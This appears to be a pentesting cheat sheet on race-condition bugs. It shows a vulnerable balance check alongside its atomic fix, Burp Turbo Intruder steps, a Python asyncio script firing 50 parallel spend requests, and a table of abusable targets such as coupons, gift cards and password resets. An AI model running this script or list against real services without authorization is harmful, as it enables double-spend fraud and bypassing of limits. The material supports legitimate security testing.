# Race Conditions

## Classic Double-Spend
```python
# VULNERABLE
def spend_credit(user_id, amount):
    balance = get_balance(user_id)    # CHECK
    if balance >= amount:
        deduct(user_id, amount)       # USE — gap here

# SECURE (atomic)
rows = db.execute("UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?",
                  amount, user_id, amount)
if rows == 0: raise InsufficientBalance()
```

## Testing

### Turbo Intruder (Burp) — Best for Single-Packet
```
1. Capture request in Burp
2. Right-click → Send to Turbo Intruder
3. Set "single-packet" engine
4. Add race marker (e.g., %s) where value changes
5. Run with 20-100 concurrent requests
```

### Python asyncio (Parallel)
```python
import asyncio, aiohttp

async def spend(session, token):
    async with session.post("https://target.com/api/spend",
                            json={"amount": 10},
                            headers={"Authorization": f"Bearer {token}"}) as r:
        return await r.text()

async def race():
    async with aiohttp.ClientSession() as s:
        tasks = [spend(s, "TOKEN") for _ in range(50)]
        results = await asyncio.gather(*tasks)
        print(results)

asyncio.run(race())
```

### HTTP/2 Single-Packet (Best Timing)
```bash
# Use h2c or HTTP/2 multiplexing
# All requests in ONE TCP connection = microsecond precision
```

## Race Targets
| Target | Impact |
|--------|--------|
| Coupon/promo code redemption | Free credits/items |
| Gift card / credit spending | Double spend |
| Limited stock purchase | Buy more than available |
| Rate limit bypass | Send before counter increments |
| Email verification token | Multiple verifications |
| Password reset | Multiple valid tokens |
| Account upgrade/downgrade | Free premium |

## Detection Signals
- Same request sent N times → N successes (should be 1)
- Balance goes negative
- Multiple tokens/codes generated for single action
- State updated N times instead of once

## Proof Requirements
- Show exact same request sent in parallel
- Show response proving multiple successes
- Show resulting state (negative balance, multiple items, etc.)
- Automate: script that reproduces reliably